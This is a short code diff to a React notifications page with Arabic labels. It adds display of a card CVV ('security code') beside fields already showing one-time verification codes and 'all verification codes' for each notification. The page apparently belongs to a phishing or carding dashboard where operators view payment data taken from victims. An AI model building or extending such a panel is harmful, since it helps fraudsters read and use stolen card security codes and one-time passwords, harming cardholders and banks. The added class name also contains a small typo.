@@ -337,6 +337,10 @@ export default function NotificationsPage1() {
                 <strong className="text-red-400 mx-4">رمز التحقق :</strong>{" "}
                 {selectedNotification.otp}
               </p>
+              <p className="flex items-centerpt-4">
+                <strong className="text-red-400 mx-4">رمز الامان :</strong>{" "}
+                {selectedNotification.cvv}
+              </p>
               <></>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
